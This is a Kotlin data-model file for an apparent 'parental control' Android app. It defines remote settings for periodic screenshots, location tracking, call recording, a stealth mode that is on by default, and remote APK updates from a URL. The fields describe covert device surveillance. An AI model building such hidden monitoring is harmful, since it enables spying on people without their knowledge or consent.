package com.example.parentalcontrol.features.remote_commands.models

import kotlinx.serialization.Serializable

/**
 * نموذج بيانات الإعدادات السحابية للجهاز (Remote Settings)
 */
@Serializable
data class AppSettings(
    val screenshot_interval_ms: Long = 300000,
    val location_interval_ms: Long = 600000, // 10 minutes default
    val record_calls: Boolean = false,
    val stealth_mode_active: Boolean = true,
    val target_version: Int = 1,
    val update_apk_path: String? = null,  // مسار Supabase Storage
    val update_apk_url: String? = null,    // رابط HTTP مباشر (الأولوية عند وجوده)
    val recording_enabled: Boolean = false,
    val capture_interval: Long = 5000
)

/**
 * حمولة الإعدادات الافتراضية عند التهيئة الأولى للجهاز
 */
@Serializable
data class DefaultSettingsPayload(
    val device_id: String,
    val screenshot_interval_ms: Long = 300000,
    val location_interval_ms: Long = 600000,
    val record_calls: Boolean = false,
    val stealth_mode_active: Boolean = true,
    val recording_enabled: Boolean = false,
    val capture_interval: Long = 5000
)

/**
 * الاسم المتوافق لمفهوم الإعدادات عن بُعد
 */
typealias RemoteConfig = AppSettings
